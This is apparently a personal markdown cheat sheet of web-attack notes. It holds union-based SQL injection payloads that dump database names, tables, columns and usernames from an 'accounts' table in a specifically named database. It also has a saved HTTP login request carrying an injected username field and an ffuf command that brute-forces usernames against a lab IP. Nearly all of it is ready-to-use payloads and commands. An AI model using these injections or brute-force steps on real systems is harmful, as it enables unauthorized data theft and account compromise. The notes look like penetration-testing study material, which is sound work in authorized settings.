
### UNION BASED SQLI
info gathering 
```
1'union select 1,2,3,databases(),user(),version(),7 -- -
```

tables name dump
```
'union select 1,2,3,4,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = 'host1244535_siska'),version(),7 -- - 
```

column dump
```
'union select 1,2,3,4,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema = 'host1244535_siska'),version(),7 -- -
```

table data dump
```
'union select 1,2,3,4,(SELECT GROUP_CONCAT(username) from host1244535_siska.accounts ),version(),7 -- -
```
or
```
'union select 1,2,3,4,(SELECT username from host1244535_siska.accounts ),version(),7 -- -
```

ref:-
https://www.hackingloops.com/sql-injection-union-based-exploitation-part-2-the-injection/
https://book.hacktricks.xyz/pentesting-web/sql-injection



### Username Brutforce with FFUF

simple request
![Alt text](image.png)

save  req to req.txt
```
POST / HTTP/1.1
Host: 10.10.128.5
Content-Length: 34
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.128.5
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.128.5/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

username=FUZZ'AND+1=1+--+-&password=a
```

run below FFUF command
```
ffuf -request req.txt -u http://10.10.128.5/ -w ~/Tools/SecLists/Usernames/xato-net-10-million-usernames-dup.txt
```
![[Pasted image 20230903233728.png]]
NOTE:- we might need to pass -u with url to use http or https